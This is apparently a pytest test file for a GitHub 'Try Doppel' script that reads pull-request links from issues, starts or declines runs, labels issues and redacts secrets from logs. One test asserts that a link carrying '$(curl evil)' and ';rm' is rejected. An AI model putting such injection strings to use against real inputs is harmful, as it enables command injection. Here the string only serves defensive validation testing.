"""try/scripts/try_pr.py: the steps behind "Try Doppel" (an issue with a PR link gets a Doppel run)."""
import importlib.util
import urllib.error
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parent.parent / "try" / "scripts" / "try_pr.py"
PULL = {"title": "Describe has_password", "body": "Docs only.", "base": {"ref": "main", "sha": "a" * 40,
                                                                       "repo": {"size": 2048}}}


def load():
    spec = importlib.util.spec_from_file_location("try_pr", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def t(monkeypatch, tmp_path):
    mod, calls = load(), []

    def fake(method, path, body=None):
        calls.append((method, path, body))
        if "/pulls/" in path:
            if "missing" in path:
                raise urllib.error.HTTPError(path, 404, "Not Found", {}, None)
            return PULL
        if path.startswith("/search/"):
            return {"total_count": int(mod.os.environ.get("TODAY", "1"))}
        return {}

    monkeypatch.setattr(mod, "_request", fake)
    monkeypatch.setenv("GITHUB_REPOSITORY", "me/doppel-try")
    monkeypatch.setenv("ISSUE", "7")
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "out"))
    monkeypatch.chdir(tmp_path)
    mod.calls = calls
    return mod


def outputs(tmp_path):
    return dict(line.split("=", 1) for line in (tmp_path / "out").read_text().splitlines())


def test_finds_the_pull_request_link_in_an_issue_form():
    t = load()
    body = "### Pull request link\n\nhttps://github.com/Maukthik/doppel-demo/pull/1\n"
    assert t.find_pr(body) == ("Maukthik", "doppel-demo", 1)
    assert t.find_pr("see https://github.com/a-b/c.d_e/pull/42/files") == ("a-b", "c.d_e", 42)
    assert t.find_pr("https://github.com/a/b/issues/3") is None
    assert t.find_pr("$(curl evil) https://github.com/a/b;rm/pull/1") is None
    assert t.find_pr(None) is None


def test_a_good_link_starts_a_run_and_says_so(t, tmp_path, monkeypatch):
    monkeypatch.setenv("ISSUE_BODY", "### Pull request link\n\nhttps://github.com/o/app/pull/5")
    assert t.main(["start"]) == 0
    assert outputs(tmp_path) == {"go": "true", "url": "https://github.com/o/app/pull/5", "owner": "o",
                                 "repo": "app", "number": "5"}
    reply = t.calls[-1]
    assert reply[1] == "/repos/me/doppel-try/issues/7/comments" and "Running Doppel" in reply[2]["body"]


@pytest.mark.parametrize("body, env, says", [
    ("no link here", {}, "couldn't find a pull request link"),
    ("https://github.com/o/missing/pull/1", {}, "only try **public** pull requests"),
    ("https://github.com/o/app/pull/1", {"TODAY": "26"}, "the limit for this public demo"),
    ("https://github.com/o/app/pull/1", {"MAX_REPO_MB": "1"}, "more than this public demo clones"),
])
def test_no_run_and_a_reason_when_it_cant(t, tmp_path, monkeypatch, body, env, says):
    monkeypatch.setenv("ISSUE_BODY", body)
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    assert t.main(["start"]) == 0
    assert outputs(tmp_path)["go"] == "false"
    replies = [c[2]["body"] for c in t.calls if c[1].endswith("/comments")]
    assert len(replies) == 1 and says in replies[0]
    assert ("POST", "/repos/me/doppel-try/issues/7/labels", {"labels": ["not run"]}) in t.calls
    assert t.calls[-1] == ("PATCH", "/repos/me/doppel-try/issues/7", {"state": "closed", "state_reason": "not_planned"})


def test_fallback_report_hides_the_secrets(t, tmp_path, monkeypatch):
    monkeypatch.setenv("NEBIUS_API_KEY", "sekrit-123")
    (tmp_path / ".doppel" / "out").mkdir(parents=True)
    (tmp_path / ".doppel/out/doppel.log").write_text("auth with sekrit-123 failed\n" + "`" * 3 + "\n")
    t.main(["fallback"])
    report = (tmp_path / ".doppel/out/report.md").read_text()
    assert "couldn't check" in report and "sekrit" not in report and "***" in report
    assert report.count("`" * 3) == 2   # the log can't close the code block early


@pytest.mark.parametrize("code, label", [("0", "no regressions"), ("1", "regression found"),
                                         ("2", "couldn't check"), ("", "couldn't check")])
def test_the_issue_is_labeled_with_the_outcome(t, code, label):
    t.main(["label", code] if code else ["label"])
    assert t.calls[-1] == ("POST", "/repos/me/doppel-try/issues/7/labels", {"labels": [label]})
